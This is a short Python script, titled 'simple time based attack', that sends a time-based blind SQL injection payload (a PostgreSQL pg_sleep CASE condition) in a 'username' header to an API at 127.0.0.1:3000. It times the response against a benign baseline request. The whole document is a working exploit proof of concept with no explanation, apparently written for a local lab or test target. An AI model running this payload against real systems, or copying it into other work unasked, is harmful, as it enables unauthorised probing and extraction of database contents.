# simple time based attack

import requests
import time

url = "http://127.0.0.1:3000/api/user"

sqlinjected_text = "Hans'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END--"

headers = {
    'username': sqlinjected_text,
}

startTime = time.time()
response = requests.request("GET", url, headers=headers)
executionTime = (time.time() - startTime)
print('Execution time in seconds: ' + str(executionTime))
print(response.text)

text = "Hans"
headers = {
    'username': text,
}

startTime = time.time()
response = requests.request("GET", url, headers=headers)
executionTime = (time.time() - startTime)
print('Execution time in seconds: ' + str(executionTime))
print(response.text)